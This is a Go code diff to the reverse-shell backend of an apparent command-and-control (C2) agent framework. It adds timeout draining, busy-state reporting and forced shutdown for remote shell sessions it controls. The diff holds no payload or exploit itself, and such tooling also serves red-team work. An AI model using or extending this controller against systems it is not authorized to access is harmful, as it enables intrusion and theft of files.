@@ -3,14 +3,26 @@ package shell
 import (
 	"context"
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"net"
 	"os"
 	"path/filepath"
 	"strings"
 	"sync"
+	"time"
 
 	"c2agent/internal/agent"
+)
+
+const (
+	// shutdownGrace bounds how long Backend.Shutdown waits for the controlled
+	// end to close the socket on its own before the C2 forces it shut.
+	shutdownGrace = 1 * time.Second
+	// maxDrainLineBuf caps the partial-line buffer while a timed-out command is
+	// being drained: its content is discarded anyway, so a runaway command
+	// cannot grow memory without bound.
+	maxDrainLineBuf = 32 * 1024
 )
 
 type shellResult struct {
@@ -24,6 +36,10 @@ type pendingReq struct {
 	raw         bool
 	lines       []string
 	ch          chan shellResult
+	// draining is set once the request times out: the command is still
+	// running, so its remaining output is discarded (not buffered) while the
+	// reader waits for the marker to resynchronize.
+	draining bool
 }
 
 // Backend drives one raw reverse shell using the echo-marker framing.
@@ -75,7 +91,9 @@ func (b *Backend) requestMode(ctx context.Context, command string, raw bool) (st
 	b.mu.Lock()
 	if b.pending != nil {
 		b.mu.Unlock()
-		return "", agent.NewNetworkError("agent %s is busy", b.id)
+		// A previous command timed out and is still running (its marker has not
+		// arrived); refuse to write a new command into the middle of it.
+		return "", agent.ErrAgentBusy
 	}
 	b.pending = p
 	b.lineBuf = ""
@@ -91,9 +109,41 @@ func (b *Backend) requestMode(ctx context.Context, command string, raw bool) (st
 	case r := <-p.ch:
 		return r.out, r.err
 	case <-ctx.Done():
+		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
+			// Execution timeout. Leave the request pending and the connection
+			// open: the command may still be running, so its late output must
+			// not be attributed to a later request. Busy() now reports true, so
+			// no further command is written until the marker arrives; the
+			// dispatcher decides whether to disconnect or keep waiting
+			// (timeout_action).
+			b.markDraining(p)
+			return "", ctx.Err()
+		}
+		// Cancelled (session stop / agent close): the command may still be
+		// running and its late output must never be attributed to a later
+		// request, so give up on this request and drop the connection.
 		b.abortRequest(p)
 		return "", ctx.Err()
 	}
+}
+
+// markDraining flags a timed-out request so its remaining output is discarded
+// (only the marker is sought) and drops any content buffered so far.
+func (b *Backend) markDraining(p *pendingReq) {
+	b.mu.Lock()
+	if b.pending == p {
+		p.draining = true
+		p.lines = nil
+	}
+	b.mu.Unlock()
+}
+
+// Busy reports whether a request is still outstanding (e.g. a command that
+// timed out but has not finished). Implements agent.BusyReporter.
+func (b *Backend) Busy() bool {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	return b.pending != nil
 }
 
 // abortRequest clears the pending request and drops the connection: a
@@ -151,6 +201,13 @@ func (b *Backend) handleData(data string) {
 	for {
 		idx := strings.IndexByte(b.lineBuf, '\n')
 		if idx < 0 {
+			// While draining, bound the partial-line buffer: a line longer than
+			// the cap cannot be the (short) marker, so drop it instead of
+			// letting a runaway command grow memory. The normal path keeps full
+			// lines (Windows read_file returns one long base64 line).
+			if b.pending != nil && b.pending.draining && len(b.lineBuf) > maxDrainLineBuf {
+				b.lineBuf = ""
+			}
 			return
 		}
 		line := strings.TrimRight(b.lineBuf[:idx], "\r")
@@ -171,7 +228,7 @@ func (b *Backend) handleData(data string) {
 			b.lineBuf = ""
 			continue
 		}
-		if b.pending != nil {
+		if b.pending != nil && !b.pending.draining {
 			b.pending.lines = append(b.pending.lines, line)
 		}
 	}
@@ -260,9 +317,20 @@ func (b *Backend) Download(ctx context.Context, srcPath, destDir string) (string
 	return dest, nil
 }
 
-// Shutdown closes the shell by sending "exit".
+// Shutdown closes the shell by sending "exit", then waits briefly for the
+// controlled end to close the socket. If it does not (e.g. a wedged shell or a
+// command eating the input), the C2 forces the connection shut so a dead
+// connection cannot linger in the registry forever.
 func (b *Backend) Shutdown(ctx context.Context) error {
-	return b.write([]byte("exit\n"))
+	if err := b.write([]byte("exit\n")); err != nil {
+		return err
+	}
+	select {
+	case <-b.closed:
+	case <-time.After(shutdownGrace):
+		_ = b.conn.Close()
+	}
+	return nil
 }
 
 // Close closes the underlying connection.
